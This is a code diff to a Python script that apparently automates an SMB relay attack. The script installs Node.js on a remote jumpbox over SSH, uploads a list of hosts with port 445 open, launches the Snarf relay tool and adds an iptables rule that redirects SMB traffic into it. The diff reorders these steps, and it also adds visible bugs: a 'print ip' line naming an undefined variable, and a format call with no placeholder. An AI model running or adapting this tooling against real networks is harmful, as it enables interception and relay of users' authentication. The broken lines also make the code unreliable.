@@ -60,12 +60,13 @@ def create_smb_hostfile(report, home_dir):
         if host.is_up():
             for s in host.services:
                 if s.port == 445 and s.state == 'open':
+                    print ip
                     smb_hosts.append(host.address)
 
-    with open('{}snarf/smb_hosts.txt'.format(home_dir), 'w') as smb:
+    with open('smb_hosts.txt'.format(home_dir), 'w') as smb:
         for h in smb_hosts:
             smb.write(h+'\n')
-    return '{}snarf/smb_hosts.txt'
+    return 'smb_hosts.txt'
 
 def get_nodejs():
     '''
@@ -411,13 +412,6 @@ def remote_main(args):
     cmd = 'apt-get install nodejs -y'
     stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=True)
 
-    # Run Snarf
-    cmd = 'screen -S snarf -dm nodejs {}snarf/snarf.js -f {}snarf/smb_hosts.txt {}'.format(home_dir, home_dir, j_local_ip)
-    stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=True)
-    time.sleep(5) # Give snarf time to startup
-    cmd = 'iptables -t nat -A PREROUTING -p tcp --dport 445 -j SNARF'
-    stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=True)
-
     # Upload SMB hosts
     local_path = os.getcwd()+'/{}'.format(hostfile)
     remote_path = '{}snarf/{}'.format(home_dir, hostfile)
@@ -425,6 +419,13 @@ def remote_main(args):
         scpc.put(local_path, remote_path)
     except SCPException:
         sys.exit('[-] Failed to copy smb_hosts.txt to the remote jumpbox')
+
+    # Run Snarf
+    cmd = 'screen -S snarf -dm nodejs {}snarf/snarf.js -f {}snarf/{} {}'.format(home_dir, home_dir, hostfile, j_local_ip)
+    stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=True)
+    time.sleep(5) # Give snarf time to startup
+    cmd = 'iptables -t nat -A PREROUTING -p tcp --dport 445 -j SNARF'
+    stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=True)
 
     # Start forwarding port 4001
     forw_server = ssh_L(jumpbox_ip, forw_port, user, pw)
